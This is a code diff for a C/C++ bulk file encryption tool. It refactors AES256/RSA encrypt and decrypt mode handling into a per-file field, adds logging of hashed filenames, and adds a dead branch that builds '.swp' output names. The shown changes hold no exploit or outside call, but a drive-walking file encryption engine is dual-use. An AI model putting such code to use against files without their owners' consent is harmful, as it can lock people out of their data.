@@ -19,6 +19,7 @@
 #include "rsa/rsa.h"
 #include "base64/base64.h"
 #include "global_parameters.h"
+#include "CommandParser.h"
 
 #ifdef __linux__
 #include <sys/stat.h>
@@ -196,7 +197,7 @@ static bool EncryptFileFullData(PFILE_INFO FileInfo)
 	DWORD padding = 0;
 	bool isAes = FileInfo->CryptInfo->method_policy == CryptoPolicy::AES256
 		|| FileInfo->CryptInfo->method_policy == CryptoPolicy::RSA_AES256;
-	if (isAes && GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT)
+	if (isAes && FileInfo->dcrypt == (int)EncryptCipher::CRYPT)
 		padding = aes256_padding(BytesRead) - BytesRead;
 		
 
@@ -215,7 +216,7 @@ static bool EncryptFileFullData(PFILE_INFO FileInfo)
 
 	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);
 	
-	if(isAes && GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT)
+	if(isAes && FileInfo->dcrypt == (int)EncryptCipher::DECRYPT)
 	{
 		memory::memzero_explicit(&FileBuffer[FileInfo->Filesize - FileInfo->padding], FileInfo->padding);
 		FileInfo->Filesize -= FileInfo->padding;
@@ -644,8 +645,8 @@ bool filesystem::EncryptRSA
 )
 {
 	bool success = false;
-	bool g_decrypt = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT ? true : false;
-	bool g_crypt = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT ? true : false;
+	bool g_decrypt = FileInfo->dcrypt == (int)EncryptCipher::DECRYPT ? true : false;
+	bool g_crypt = FileInfo->dcrypt == (int)EncryptCipher::CRYPT ? true : false;
 	if (g_crypt && FileInfo->Filesize > FileInfo->CryptInfo->desc.size - 11)
 	{
 		LOG_ERROR("[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); " log_str, FileInfo->Filename);
@@ -1123,6 +1124,8 @@ bool filesystem::HashSumFile(PCRYPT_INFO CryptInfo, DESC desc_file, TCHAR* Filen
 	sha256_final_context(&ctx, out);
 
 	PHASH_LIST hash = new HASH_LIST;
+	hash->Filename = Filename;
+	LOG_SUCCESS("%s", hash->Filename);
 	hash->hash = out;
 	hash->hash_size = 32;
 	CryptInfo->hash_data.HashList->SLIST_INSERT_HEAD_SAFE(hash);
@@ -1496,6 +1499,22 @@ TCHAR* filesystem::NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data)
 		return NULL;
 	}
 	
+	if(false)
+	{
+		size_t lenf = memory::StrLen(data->Filename);
+		if((lenf + 5) > MAX_PATH)
+		{
+			LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
+			return NULL;
+		}
+		TCHAR* swp_name = (TCHAR*)memory::m_malloc((MAX_PATH + len_path) * Tsize);
+		memc(swp_name, data->Path, len_path);
+		memc(&swp_name[len_path], slash, 1);
+		memc(&swp_name[len_path + 1], data->Filename, lenf);
+		memc(&swp_name[len_path + 1 + lenf], T(".swp"), 4);
+		return swp_name;
+	}
+	
 	TCHAR* name = CryptInfo->name_method(data->Path, data->Filename, data->Exst, data->FullPath);
 	if(name == NULL)
 		return NULL;
@@ -1505,7 +1524,7 @@ TCHAR* filesystem::NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data)
 		return NULL;
 	}
 
-	TCHAR* fullpath = (TCHAR*)memory::m_malloc((MAX_PATH + memory::StrLen(data->Path)) * Tsize);
+	TCHAR* fullpath = (TCHAR*)memory::m_malloc((MAX_PATH + len_path) * Tsize);
 	if(GLOBAL_PATH.g_Path_out)
 		memc(fullpath, GLOBAL_PATH.g_Path_out, memory::StrLen(GLOBAL_PATH.g_Path_out));
 	else
